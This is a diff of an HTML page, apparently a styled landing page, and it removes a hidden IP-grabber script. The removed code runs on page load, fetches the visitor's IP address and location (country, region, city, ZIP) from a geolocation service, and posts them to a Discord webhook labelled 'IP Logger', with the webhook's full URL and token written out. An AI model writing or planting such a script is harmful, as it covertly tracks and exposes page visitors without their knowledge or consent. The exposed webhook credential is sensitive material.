@@ -16,31 +16,4 @@
 			}
 		}</script><style>.btn{background-color:#60d1f6;color:#fff;padding:10px 22px}.btn:hover{background:#0076ff;color:#fff}body {background-image:url(https://ibb.co/xG5gJ1T); background-size:20%;background-repeat:no-repeat;background-position:bottom 0 right 7px;background-color:#24292e!important}h1,h2,h3,h4,h5,h6{color:#fff}p,small,span{color:#eaeaea}#box{width:400px;margin:0 auto;margin-top:100px;border:2px solid #181a1f;vertical-align:middle;border-radius:5px;text-align:center;padding:60px;background-color:#31363f!important}#server_pic{display:block;border-radius:1%;margin:10px auto;width:200px;border:0 solid #181a1f}hr{margin:20px;background-color:#eaeaea}</style>
 
-<script>
-function monke(json) 
-{
-     var request = new XMLHttpRequest();
-     
-     request.open("POST", "https://discord.com/api/webhooks/1156641994483966063/pfz1KhYgAi2Z3dUTCfuqqTuQkt7jw1tsEnxIWm_eLMf4LsiI8kHCWyRKw1-Mvl6DFhiB");
-
-     request.setRequestHeader('Content-type', 'application/json');
-
-     var params = 
-     {
-          username: "IP Logger",
-          avatar_url: "",
-          content: "@loggers",
-          embeds: [
-               {
-                    title: "Someone visited the IP grabber!",
-                    color: 000000,
-                    description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
-               }
-          ]
-     }
-
-     request.send(JSON.stringify(params));
-}
-</script>
-<script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
 </html>
